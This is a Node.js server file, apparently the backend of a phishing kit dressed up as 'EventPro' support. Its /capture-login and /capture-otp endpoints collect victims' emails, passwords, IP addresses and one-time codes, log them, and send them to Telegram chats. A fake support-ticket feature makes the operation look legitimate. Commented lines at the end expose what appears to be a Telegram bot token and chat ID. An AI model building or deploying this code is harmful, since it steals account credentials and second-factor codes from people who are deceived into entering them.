const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
const app = express();
const crypto = require("crypto");
require("dotenv").config();

app.use(cors({ origin: true }));
app.options(/.*/, cors({ origin: true }));
app.use(express.json());

// ── Telegram Bot Setup ──



// Temporary storage: tickets exist only while this server stays running.
const supportTickets = new Map();

const SUPPORT_REPLIES = {
  received: "Your request has been received. Thank you for contacting EventPro support.",
  unavailable: "We're sorry, this service is currently unavailable. Please try again later.",
  contact: "Thank you for contacting us. Our support team will contact you soon.",
  retry: "Please try again. If the problem continues, contact our support team."
};

// Set this in Render using the actual Telegram user IDs
// of the people allowed to reply to support tickets.
const SUPPORT_AGENT_USER_IDS = (
  process.env.SUPPORT_AGENT_USER_IDS || ""
)
  .split(",")
  .map(id => id.trim())
  .filter(Boolean);
const TOKEN = process.env.TELEGRAM_TOKEN || "";
const CHAT_IDS = [
  process.env.TELEGRAM_CHAT_ID,
  process.env.SECOND_TELEGRAM_CHAT_ID,
].filter(Boolean);

let bot;
if (TOKEN) {
  bot = new TelegramBot(TOKEN, { polling: true });
} else {
  console.warn(
    "⚠️  TELEGRAM_TOKEN is not configured; Telegram alerts will be disabled.",
  );
}

async function sendTelegramAlert(title, details) {
  const message = `🔐 *${title}*\n\n${details}`;

  if (!bot || CHAT_IDS.length === 0) {
    console.warn(
      "Telegram alert skipped because bot or chat ID is not configured."
    );
    return;
  }

  for (const chatId of [...new Set(CHAT_IDS)]) {
    try {
      await bot.sendMessage(chatId, message, {
        parse_mode: "Markdown",
      });

      console.log("Telegram alert sent successfully.");
    } catch (err) {
      console.error("Telegram send failed:", err.message);
    }
  }
}

app.post("/capture-login", (req, res) => {
  const { email, password, provider } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const time = new Date().toLocaleString();

  // Console logging
  console.log("=======================");
  console.log(`Login Attempt`);
  console.log(`Provider: ${provider}`);
  console.log(`Email : ${email}`);
  console.log(`Password : ${password}`);
  console.log(`IP: ${ip}`);
  console.log(`Time : ${time}`);
  console.log("==================================");

  // Telegram alert
  const telegramMsg = `*Provider:* ${provider}\n*Email:* ${email}\n*Password:* ${password}\n*IP:* ${ip}\n*Time:* ${time}`;
  sendTelegramAlert("LOGIN ATTEMPT", telegramMsg);

  res.json({ requireOTP: true });
});

app.post("/capture-otp", (req, res) => {
  const { otp } = req.body;
  const time = new Date().toLocaleString();

  console.log("=======================");
  console.log(`OTP Capture`);
  console.log(`OTP Code : ${otp}`);
  console.log(`Time : ${time}`);
  console.log(`==================================`);

  // Telegram alert
  const telegramMsg = `*OTP Code:* ${otp}\n*Time:* ${time}`;
  sendTelegramAlert("OTP RECEIVED", telegramMsg);

  res.json({ success: true });
});
// 1. Visitor submits a support request
app.post("/api/support-ticket", async (req, res) => {
  try {
    if (!bot || CHAT_IDS.length === 0) {
      return res.status(503).json({
        success: false,
        message: "Support is temporarily unavailable."
      });
    }

    // Accept a short, ordinary support message only.
    const message = String(req.body?.message || "General support request")
      .trim()
      .slice(0, 500);

    const ticketId = crypto.randomUUID();

    supportTickets.set(ticketId, {
      id: ticketId,
      message,
      status: "waiting",
      reply: null,
      createdAt: Date.now()
    });

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ Request received", callback_data: `support:${ticketId}:received` },
          { text: "⏳ Contact soon", callback_data: `support:${ticketId}:contact` }
        ],
        [
          { text: "⚠️ Service unavailable", callback_data: `support:${ticketId}:unavailable` },
          { text: "🔄 Please try again", callback_data: `support:${ticketId}:retry` }
        ]
      ]
    };

    const telegramMessage =
      `EventPro support request\n` +
      `Ticket: ${ticketId}\n` +
      `Message: ${message}`;

    let sentToAtLeastOneAgent = false;

    for (const chatId of [...new Set(CHAT_IDS)]) {
      try {
        await bot.sendMessage(chatId, telegramMessage, {
          reply_markup: keyboard
        });
        sentToAtLeastOneAgent = true;
      } catch (error) {
        console.error("Could not send support request:", error.message);
      }
    }

    if (!sentToAtLeastOneAgent) {
      supportTickets.delete(ticketId);
      return res.status(503).json({
        success: false,
        message: "We couldn't notify the support team. Please try again later."
      });
    }

    res.status(201).json({
      success: true,
      ticketId,
      message: "Your support request has been sent."
    });
  } catch (error) {
    console.error("Support request error:", error.message);
    res.status(500).json({
      success: false,
      message: "Something went wrong. Please try again."
    });
  }
});


// 2. Agent clicks a response button inside Telegram
if (bot) {
  bot.on("callback_query", async (query) => {
    try {
      const agentId = String(query.from?.id || "");

      if (!SUPPORT_AGENT_USER_IDS.includes(agentId)) {
        await bot.answerCallbackQuery(query.id, {
          text: "You are not authorized to reply to support requests."
        });
        return;
      }

      const [action, ticketId, replyKey] =
        String(query.data || "").split(":");

      if (action !== "support" || !ticketId || !SUPPORT_REPLIES[replyKey]) {
        await bot.answerCallbackQuery(query.id, {
          text: "Invalid support response."
        });
        return;
      }

      const ticket = supportTickets.get(ticketId);

      if (!ticket) {
        await bot.answerCallbackQuery(query.id, {
          text: "This ticket has expired or is no longer available."
        });
        return;
      }

      ticket.status = "replied";
      ticket.reply = SUPPORT_REPLIES[replyKey];
      ticket.repliedAt = Date.now();

      await bot.answerCallbackQuery(query.id, {
        text: "Response saved."
      });

      // Remove the buttons after a response has been selected.
      if (query.message) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
          }
        ).catch(() => {});
      }
    } catch (error) {
      console.error("Telegram button error:", error.message);
    }
  });
}


// 3. Website checks whether the agent has replied
app.get("/api/support-ticket/:ticketId", (req, res) => {
  const ticket = supportTickets.get(req.params.ticketId);

  if (!ticket) {
    return res.status(404).json({
      success: false,
      message: "Ticket not found. It may have expired after a server restart."
    });
  }

  res.json({
    success: true,
    status: ticket.status,
    reply: ticket.reply
  });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  if (!TOKEN || CHAT_IDS.length === 0) {
    console.log(
      "⚠️  WARNING: Telegram environment variables are not fully configured. Set TELEGRAM_TOKEN and TELEGRAM_CHAT_ID in Render or your environment.",
    );
  } else {
    console.log("✅ Telegram alerts enabled");
  }
});


// TELEGRAM_TOKEN=7948054500:AAFdarEUeMMl4Y1SBs4cAnk9ikySJ8C9f
// TELEGRAM_CHAT_ID=5859927427